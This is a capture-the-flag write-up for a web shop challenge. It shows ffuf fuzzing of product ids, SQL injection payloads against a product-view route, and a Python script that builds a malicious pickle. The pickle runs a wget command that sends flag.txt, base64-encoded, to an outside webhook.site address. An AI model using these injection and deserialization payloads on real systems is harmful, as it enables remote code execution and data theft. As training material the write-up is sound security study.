# Enumeration

## Manual Enumeration

- there is no interesting thing on the home page and not many functionalities, let’s start fuzzing the website to find any juicy point while we explore its functions manually.

![Untitled](/assets/images/COP/Untitled.png)

- we can view products using their id using `http://<IP>:<port>/view/<product_id>`

## Fuzzing the website

- A quick fuzzing with common.txt doesn't show anything interesting

## Fuzzing Products

- Using the information I found earlier that I can see products using the link `/view/<Product ID >` I could fuzz to identify all the products may I find anything useful

```bash
 for id in {-1000..1000}; do echo $id ; done | ffuf -u 'http://144.126.230.162:31693/view/FUZZ' -w - -c -fc 500
```

- As we can see, there are no other pages
- From Here I start thinking to go the other way and read the source code

## Reviewing the Source Code

- let’s check the source code

The developer made a big mistake here the `product_id`  passed directly to the SQL query this leads to  SQL injection and according to our privileges we can

# SQL Injection

- when viewing a product the query executed without any input validation
- `http://144.126.230.162:31693/view/2'%20OR%201%20=%202%20--%20-`

`http://144.126.230.162:31693/view/2'%20OR%201%20=%202%20--%20-`

- the website is vulnerable to SQLi, we can confirm it by comparing the two images.
- In the first image, we injected this payload `2' OR 1 = 1 -- -`, (It’s not the best payload because if there is any firewall it will block the request, but it’s just a simple PoC), the first product in query result was product 1 (Pickle Shirt), not product 2 because the query is always true (1=1) `SELECT data FROM products WHERE id='2' or 1=1 -- -’`
- in the second image, we inject this payload `2' OR 1 = 2 -- -` which makes the condition false so the query result should be the second product, which is (Pickle Shirt 2), so it’s a valid SQLi
- After running sqlmap to exploit SQLi and dump the database, nothing interesting found

# Insecure Deserialization

- we noticed that the app usewe noticed that the app uses pickles pickle

![Untitled](/assets/images/COP/Untitled%207.png)

![Untitled](/assets/images/COP/Untitled%208.png)

- this snippet displays all the products by looping over the products list and setting the variable `item` to the `product.data` attribute which is a pickle object so is passed to `pickle` filter defined [here](https://www.notion.so/C-O-P-d535069fbda84ec095a8e1ca47483297?pvs=21), and uses the `item` to display the product information such as its name
- we already know that the app is vulnerable to SQLi, so we can inject a malicious product to exploit insecure deserialization.

```python
import pickle
import os
from base64 import b64encode, b64decode

class Evil(object):
    def __reduce__(self):
        return (os.system,("wget https://webhook.site/cdf3f8e3-8751-41a2-91ec-40ca7a9a8679/$(cat flag.txt | base64)",))

e = Evil()
payload = b64encode(pickle.dumps(e))
print(payload.decode())
```

- code Explanation
    1. Importing Required Modules:
        - The code imports the necessary modules: **`pickle`**, **`os`**, and **`b64encode`** and **`b64decode`** from the **`base64`** module.
    2. Defining the **`Evil`** Class:
        - The **`Evil`** class is defined, which inherits from the **`object`** class (implicitly).
        - The **`Evil`** class overrides the **`__reduce__()`** method.
        - The **`__reduce__()`** method is a special method used by **`pickle`** for serialization and deserialization.
        - In this case, the **`__reduce__()`** method is defined to return a tuple containing the function **`os.system`** and command as a string.
    3. Creating an Instance and Generating Payload:
        - An instance **`e`** of the **`Evil`** class is created.
        - The **`pickle.dumps()`** function is called with **`e`** as an argument to serialize the object.
        - The resulting serialized object is then encoded using **`b64encode()`** from the **`base64`** module to obtain a Base64-encoded payload.
    4. Printing the Payload:
        - The Base64-encoded payload is printed using **`print(payload.decode())`**.

The intention behind this code is to generate a payload that, when deserialized by a vulnerable or unsuspecting application, will execute the command specified in the **`__reduce__()`** method. In this case, the command is a **`wget`** command that downloads a file (**`flag.txt`**) and sends it to a specific URL (**`https://webhook.site/cdf3f8e3-8751-41a2-91ec-40ca7a9a8679/`**).

```bash

```

- the query after injecting the payload will be the following

```bash
SELECT data FROM products WHERE id='' UNION SELECT 'Malicious Pickle Object' -- -'
```
